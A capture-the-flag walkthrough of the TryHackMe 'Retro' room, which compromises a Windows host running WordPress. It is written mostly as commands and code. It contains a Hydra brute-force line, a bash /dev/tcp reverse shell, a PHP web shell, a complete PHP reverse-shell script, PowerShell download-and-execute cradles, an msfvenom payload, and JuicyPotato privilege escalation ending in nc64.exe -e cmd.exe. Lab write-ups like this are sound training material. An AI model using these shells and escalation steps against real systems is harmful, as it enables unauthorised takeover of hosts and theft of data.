# Retro

**Room Link:** [https://tryhackme.com/room/retro](https://tryhackme.com/room/retro)

## Scanning

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (11) (12).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

port 5986 discovered. Potentially we can use this later for WinRM.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

### HTTP port 80



**Kali**

```
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
```

**Kali**

```
wpscan --url http://$VICTIM/retro
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wpscan --url http://$VICTIM/retro --enumerate u
```

<figure><img src="../../.gitbook/assets/image (21) (6).png" alt=""><figcaption></figcaption></figure>

### Burp

wpscan identified that XML-RPC was enabled but it wasn't very useful going forward.

```
POST /retro/xmlrpc.php HTTP/1.1
Host: 10.10.62.245
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>





### Hydra

I tried to bruteforce wades account but no luck. Looking back later the password was not in the below password list but it was in rockyou.txt but it would have taken awhile to find it.

```
hydra -l wade -P darkweb2017-top1000.txt $VICTIM/retro http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
```

###

wade added his password to one of the blog posts and from there I could login to wp-login.

<figure><img src="../../.gitbook/assets/image (3) (14).png" alt=""><figcaption></figcaption></figure>



```
Username: wade
Password: parzival
```

<figure><img src="../../.gitbook/assets/image (23) (5).png" alt=""><figcaption></figcaption></figure>



## Reverse Shell

### Reverse Shell Failed Attempt

**revshell.php code**

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
?>
```

**Kali**

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (22) (7) (1).png" alt=""><figcaption></figcaption></figure>

I realized my reverse shell wasn't working as it is a Windows box. I uploaded a web shell and ran commands to realize this.

### PHP web shell

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```



<figure><img src="../../.gitbook/assets/image (45) (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (71) (2).png" alt=""><figcaption></figcaption></figure>





### PHP web shell #2

This shell was better as it gave me a reverse shell rather than just a web one.

```
<?php
// Copyright (c) 2020 Ivan `incek
// v2.5
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.167.13', 9000);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

**Kali**

```
rlwrap nc -lvnp 9000
```

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>



Load Invoke-winPEAS.ps1 into memory.

**Kali**

```
wget https://gist.githubusercontent.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0/raw/2318ef41f55e7e1a2172a2e67551201c24ee7681/Invoke-winPEAS.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**Invoke-winPEAS.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (35) (4) (1).png" alt=""><figcaption></figcaption></figure>



Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
</strong></code></pre>





## Shell

After a lot of time wasted I realized there was no where to write files to and this account was a dead end. Then tried to RDP in as wade since we had a potential password for him.

**Kali**

```
xfreerdp +clipboard /u:"wade" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
Password: parzival
```

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1')
</strong></code></pre>

**Kali**

```
wget https://gist.githubusercontent.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0/raw/2318ef41f55e7e1a2172a2e67551201c24ee7681/Invoke-winPEAS.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**Invoke-winPEAS.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/Invoke-winPEAS.ps1') 
</strong></code></pre>

## Privilege Escalation Option #1

For this I wouldn't normally know how to detect but when you open up chrome  the exploit is already bookmarked.

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

**Kali**

Download [https://packetstormsecurity.com/files/download/14437/hhupd.exe](https://packetstormsecurity.com/files/download/14437/hhupd.exe)

```
python2 -m SimpleHTTPServer 81
```

**Victim(cmd)**

```
cd Downloads
certutil -urlcache -f http://10.10.162.126:81/hhupd.exe hhupd.exe
```

<figure><img src="../../.gitbook/assets/image (44) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (36) (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Navigate to **C:\Windows\System32** and type in **\*.\*** to show all files.

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Open the cmd prompt and it open as an Administrator account, but note if you already had Internet explorer open it won't work so make sure it is closed before starting

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (33) (2).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation Option #2&#x20;

Since the web user had more access than Wade but we couldn't write anywhere I made a folder that they could write to.

**Kali**

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.133.11 lport=1337 -f exe -o exploit.exe
python2 -m SimpleHTTPServer 81
```

**Victim(cmd) - Wade**

```
cd C:\
mkdir test
cd test
certutil -urlcache -f http://10.10.133.11:81/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -f http://10.10.133.11:81/exploit.exe exploit.exe
```

**Kali**

```
nc -lvnp 1337
```

**Victim(cmd) - retro**

```
JuicyPotato.exe -l 1337 -p exploit.exe -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
```

<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation Option #3&#x20;

This is still with Juicy Potato but just a slightly different way using nc64.exe instead of a reverse shell.

**Kali**

```
git clone https://github.com/int0x33/nc.exe.git
cd nc.exe/
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
python2 -m SimpleHTTPServer 81
```

**Victim(cmd) - Wade**

```
cd C:\
mkdir test
cd test
certutil -urlcache -f http://10.10.133.11:81/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -f http://10.10.133.11:81/nc64.exe nc64.exe
```

**Kali**

```
nc -lvnp 1337
```

**Victim(cmd) - retro**

```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\test\nc64.exe -e cmd.exe 10.10.133.11 1337 " -t *  -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" 
```

<figure><img src="../../.gitbook/assets/image (30) (4).png" alt=""><figcaption></figcaption></figure>
